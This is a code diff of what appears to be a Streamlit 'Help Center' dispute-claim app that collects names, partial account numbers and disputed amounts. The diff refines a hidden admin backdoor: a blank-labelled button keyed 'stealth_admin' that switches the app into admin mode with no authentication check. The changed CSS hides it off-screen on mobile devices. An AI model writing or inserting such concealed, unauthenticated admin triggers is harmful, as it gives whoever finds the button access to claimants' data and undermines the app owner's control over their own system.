@@ -82,16 +82,17 @@ st.markdown("""<style>
         box-shadow: none !important;
     }
 
-    /* NUCLEAR HIDE ON MOBILE (MAX-WIDTH 768PX) */
+    /* ULTIMATE HIDE ON MOBILE (MAX-WIDTH 768PX) */
     @media screen and (max-width: 768px) {
-        .stealth-trigger, .stealth-trigger *, [key="stealth_admin_v84"] {
+        div.stealth-trigger, 
+        div.stealth-trigger button, 
+        [data-testid="stBaseButton-secondary"] {
             display: none !important;
             visibility: hidden !important;
             opacity: 0 !important;
             pointer-events: none !important;
-            height: 0 !important;
-            width: 0 !important;
-            max-height: 0 !important;
+            position: fixed !important;
+            left: -9999px !important;
         }
     }
 
@@ -125,7 +126,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_8_4", clear_on_submit=True):
+    with st.form("claim_v32_8_5", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -146,7 +147,7 @@ if not st.session_state.admin_mode:
     """, unsafe_allow_html=True)
 
     st.markdown("<div class='stealth-trigger'>", unsafe_allow_html=True)
-    if st.button(" ", key="stealth_admin_v84"):
+    if st.button(" ", key="stealth_admin_v85"):
         st.session_state.admin_mode = True
         st.rerun()
     st.markdown("</div></div>", unsafe_allow_html=True)
